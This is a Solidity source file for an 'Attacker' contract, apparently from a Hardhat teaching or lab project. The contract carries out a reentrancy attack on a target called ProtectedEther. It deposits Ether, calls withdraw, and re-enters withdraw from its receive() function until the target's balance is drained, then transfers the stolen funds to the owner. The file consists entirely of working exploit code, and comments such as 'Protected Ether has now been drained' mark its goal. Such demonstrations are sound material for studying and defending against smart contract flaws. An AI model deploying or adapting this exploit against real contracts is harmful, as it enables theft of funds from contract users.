// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
import "hardhat/console.sol";

//Interface to properly interact with our ProtectedEther contract and its functions 
interface IProtectedEther {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IProtectedEther public immutable protectedEther;
    address private owner;

    constructor(address protectedEtherAddress) {
        protectedEther = IProtectedEther(protectedEtherAddress);
        owner = msg.sender;
    }
//Attack function that first deposits ether to initialize interaction with the contract before it can withdraw
    function attack() external payable onlyOwner {
        protectedEther.deposit{value: msg.value}();
        protectedEther.withdraw();
    }
//Recursive call on withdraw assuming the state of the contracts balance has not been reflected to the owner  
    receive() external payable {
        if (address(protectedEther).balance > 0) {
            console.log("reentering...");
            protectedEther.withdraw();
        } else {
            console.log('Prtoected Ether has now been drained');
            payable(owner).transfer(address(this).balance);
        }
    }

    // Get the attackers total balance 
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Only the owner can attack.");
        _;
    } 
}
